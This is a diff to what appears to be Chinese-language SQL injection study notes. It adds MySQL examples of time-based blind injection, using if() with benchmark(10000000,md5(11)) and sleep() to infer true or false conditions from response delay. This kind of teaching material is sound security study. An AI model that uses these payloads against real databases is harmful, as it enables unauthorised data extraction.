@@ -35,6 +35,13 @@ mysql> select if((select database())="rtest",sleep(2),666);
 +----------------------------------------------+
 1 row in set (2.00 sec)
 ```
+```
+mysql> select id,name,title from msg where id=if(1=1,benchmark(10000000,md5(11)),false);
+Empty set (2.18 sec)
+
+mysql> mysql> select id,name,title from msg where id=if(1=2,benchmark(10000000,md5(11)),false);
+Empty set (0.00 sec)
+```
 
 ### 0x01 注入点在Order by后面
 ```
